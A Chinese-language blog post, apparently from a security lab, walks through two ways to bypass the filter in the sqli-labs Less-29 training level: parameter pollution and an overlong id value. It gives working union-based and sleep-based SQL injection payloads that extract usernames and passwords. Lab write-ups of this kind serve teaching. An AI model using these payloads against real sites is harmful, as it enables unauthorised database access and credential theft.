#  [被忽略的漏洞]sqli-labs之Less-29的另一种玩法  
原创 破阵攻防实验室
                    破阵攻防实验室  破阵攻防实验室   2026-03-25 05:55  
  
**。。免责声明**  
  
    由于传播、利用此文所提供的信息而造成的任何直接或间接的后果和损失，均由使用者本人承担，  
破阵攻防实验室  
及文章作者不承担任何责任。如有侵权烦请告知，我们将立即删除相关内容并致歉。请遵守《中华人民共和国个人信息保护法》、《中华人民共和国网络安全法》等相关法律法规。  
  
  
小插曲  
  
  
    博客也是很久没有更新了，并不是博主没有学习新的知识了，鄙人是一直在学习的。关于博客更新这点，如果硬要更新内容的话也是有东西的，只是觉得没有必要，因为内容也都和网上的大同小异，只会增加冗余，所以，我就减少了更新频率，也想提高大家的阅读质量！  
  
      这次更新的内容是大家比较熟悉的，就是sqli-labs靶场。分享的这个漏洞点是我重新打sqli-labs的时候，在没有看网上的WP的情况下发现的，后面我在网上看WP分析的时候，很多博主只讲了一种大家用的比较多的方法，所以我就想通过这篇文章分享一下Less-29关卡的另一种玩法。  
  
  
常见玩法  
  
最常见的玩法就是利用参数污染  
  
payload：  
```
?id=1&id=-1'%20union%20select%201,%202,%20(select%20group_concat(username,'::',password)%20from%20users)%23
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3os73wAPEibNGG6OBX3pibXnNmpXWv5h2smssIYGyDgY3g7YrsrkVSEHib7LprbibpL0JDXzhu96xT9IQ8CtlBf99EmyoPwiauuVtY2FMYNkgClQ/640?wx_fmt=png&from=appmsg "")  
  
双参数/参数污染绕过原理：分析代码可知，WAF 检测内容来自 $_SERVER['QUERY_STRING']，而 $_SERVER['QUERY_STRING']的值是 URL 文件路径后面的所有参数，如 URL http://example.com/test.php?id=1&name=zhangsan&age=20，则 $_SERVER['QUERY_STRING']的值为 id=1&name=zhangsan&age=20，所以当 URL 文件路径后面的参数为 ?id=1&id=1'时，$_SERVER['QUERY_STRING']的值为 id=1&id=1'，  
而 $_GET['id']获取值的方式：当 URL 中存在多个同名变量时，取最后一个变量的值！二者取值不同，造成了参数污染！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3os73wAPEibPrWWtltBeHWE4vatvvdiadBicLzFr3mjdbTUZqWZPeGZ91Nyr1H9KXpHKq8Squz1fjvAe4MN0zygcKib3dTLPx4cZScXRJEW8cI0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3os73wAPEibOT9R1fd4xu499q3XAbzfayFGugibhs1F7MT5QMIbxwdp9l6KibrkQd1EQTljDicWO01jdgVac1ic1OjhyIp4H88ziamgqP90tJP9wE/640?wx_fmt=png&from=appmsg "")  
  
这种玩法的漏洞点在 java_implimentation函数中，只要该函数遍历到 id 参数就直接返回，也就是只检测第一个 id 参数的值，最终检测的是第一个同名参数的值，SQL查询语句拼接的却是最后一个同名变量的值，这就导致绕过！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3os73wAPEibMsrUNpicHcZEobArYR6s8Z2qCNHuZ29iccjJE1L9TykQe48iarnoJqUH5BF1qf1eo0J6icaT8O9jDXVEh1ytoricmH5miaJUmrkfE5Y/640?wx_fmt=png&from=appmsg "")  
  
  
  
另一种玩法  
  
这里利用长字符串绕过，payload:  
```
?id=111111111111111111111111111111'%20union%20select%201,%202,%20(select%20group_concat(username,'::',password)%20from%20users)%23
```  
  
这里没有利用参数污染，始终都只有一个 id 参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3os73wAPEibPlnibRvgfvMqpyqAsnbaYw3icMcLLml3m5icUBgujXOkmq8gCvyqib9mBSJ8dT1EQChMFa1ttagzy850IKTuBo9qaHRK4aSRwPPtA/640?wx_fmt=png&from=appmsg "")  
  
我还利用了 sleep 函数进行验证，payload：  
```
?id=111111111111111111111111111111' or sleep(0.5)%23111111111111111111111111111111' or sleep(0.5)%23
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3os73wAPEibMSfTsFhA2QhMxibbK8slbZcVmfRmFfSrR6IsOdtTRsRgOKibyvUPBUvAPLIOy6f7xV89oDlZ6yvVBTgicHkNQfxh7f2fJiawaLkEY/640?wx_fmt=png&from=appmsg "")  
  
根据响应时间验证后端确实执行了SQL语句！  
  
长字符串绕过原理：逻辑漏洞绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/3os73wAPEibMl7e56MvqUQoURyu5adYmS2dfozapu5aheQGhLyZUmqperS5qYichH0Ne19Hetu6sZlU2jEsmn9sdYRNVv8aP8h4NuDwPuhFs8/640?wx_fmt=png&from=appmsg "")  
  
java_implimentation函数只读取了 3-30范围内的 id值，然后传递给 whitelist函数进行检测，这就存在问题了，在 30 长度范围外的字符串是没有进行过滤的！当输入子串通过检测后，SQL 语句直接拼接原始输入，所以造成了 SQL 注入！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3os73wAPEibOtw3lHJ5SS6omXvWn7k4P1Q9mHk6UEcrR4ocozSMRlbz6REAxQKW7EF3Vic1sSm9AXnKx6Nib9JGRPTFOpDETzl2SMhOpIWpw1I/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3os73wAPEibMNscvUQicZWrCoVRDxhdhvshTWHuHuIlgON6cI22ibbPWqlicfMzOaiaNoHRYUcoEfJLN41d89sba9FWQLej8qiaOWiahAt57WdRlUs/640?wx_fmt=png&from=appmsg "")  
  
  
  
如果想要及时了解更多内容，请关注   
破阵攻防实验室  
   
微信公众号！  
  
  
  
